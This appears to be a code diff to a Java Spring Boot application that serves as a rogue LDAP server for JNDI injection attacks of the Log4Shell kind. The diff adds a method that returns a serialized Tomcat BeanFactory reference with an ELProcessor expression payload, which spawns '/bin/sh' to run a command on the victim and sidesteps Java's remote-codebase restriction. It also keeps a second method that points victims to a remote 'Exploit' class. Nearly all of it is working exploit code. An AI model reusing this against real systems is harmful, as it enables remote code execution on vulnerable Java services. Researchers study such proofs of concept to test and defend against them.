@@ -11,15 +11,23 @@ import com.unboundid.ldap.sdk.LDAPResult;
 import com.unboundid.ldap.sdk.ResultCode;
 import org.apache.logging.log4j.LogManager;
 import org.apache.logging.log4j.Logger;
+import org.apache.naming.ResourceRef;
 import org.springframework.beans.factory.annotation.Value;
 import org.springframework.boot.SpringApplication;
 import org.springframework.boot.autoconfigure.SpringBootApplication;
 
 import javax.annotation.PostConstruct;
+import javax.naming.StringRefAddr;
 import javax.net.ServerSocketFactory;
 import javax.net.SocketFactory;
 import javax.net.ssl.SSLSocketFactory;
+import javax.script.ScriptEngineManager;
+import javax.script.ScriptException;
+import java.io.ByteArrayOutputStream;
+import java.io.IOException;
+import java.io.ObjectOutputStream;
 import java.net.InetAddress;
+import java.util.ArrayList;
 
 @SpringBootApplication
 public class Application {
@@ -33,7 +41,7 @@ public class Application {
 
     public static void main(String[] args) {
         // open up the remote class loading for newer versions of java
-        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");
+        //System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");
 
         SpringApplication.run(Application.class, args);
     }
@@ -66,20 +74,38 @@ public class Application {
             String base = result.getRequest().getBaseDN();
             Entry entry = new Entry(base);
             try {
-                sendResult(result, base, entry);
+                sendResultBeanFactory(result, base, entry);
             } catch (Exception e1) {
                 e1.printStackTrace();
             }
         }
 
-        protected void sendResult(InMemoryInterceptedSearchResult result, String base, Entry entry) throws LDAPException {
+        protected void sendResultBeanFactory(InMemoryInterceptedSearchResult result, String base, Entry entry) throws LDAPException {
+            logger.info("sendResultBeanFactory: Send LDAP reference result for '{}'", base);
+
+            String payload = "\"\".getClass().forName(\"javax.script.ScriptEngineManager\")" +
+                    ".newInstance().getEngineByName(\"JavaScript\")" +
+                    ".eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['/bin/sh','-c','/bin/date >> /tmp/test.out']).start()\")";
+
+            entry.addAttribute("javaClassName", "java.lang.String");
+            ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "",
+                    true, "org.apache.naming.factory.BeanFactory", null);
+            ref.add(new StringRefAddr("forceString", "x=eval"));
+            ref.add(new StringRefAddr("x", payload));
+            entry.addAttribute("javaSerializedData", serialize(ref));
+
+            result.sendSearchEntry(entry);
+            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
+        }
+
+        protected void sendResultExploit(InMemoryInterceptedSearchResult result, String base, Entry entry) throws LDAPException {
             String objectClass = "javaNamingReference";
             String javaCodeBaseUrl = "http://localhost:" + port + "/code";
             String javaCodeBaseFile = "file:///tmp";
             String javaFactory = "Exploit";
             String javaClassName = "foo";
 
-            logger.info("sendResult: Send LDAP reference result for '{}' redirecting to '{}' with factory '{}' and class '{}'",
+            logger.info("sendResultExploit: Send LDAP reference result for '{}' redirecting to '{}' with factory '{}' and class '{}'",
                     base, javaCodeBaseUrl, javaFactory, javaClassName);
 
             entry.addAttribute("javaClassName", javaClassName);
@@ -90,6 +116,18 @@ public class Application {
 
             result.sendSearchEntry(entry);
             result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
+        }
+
+        private byte[] serialize(Object ref) {
+            try {
+                ByteArrayOutputStream out = new ByteArrayOutputStream();
+                ObjectOutputStream objOut = new ObjectOutputStream(out);
+                objOut.writeObject(ref);
+                return out.toByteArray();
+            } catch (IOException e) {
+                e.printStackTrace();
+            }
+            return null;
         }
     }
 }
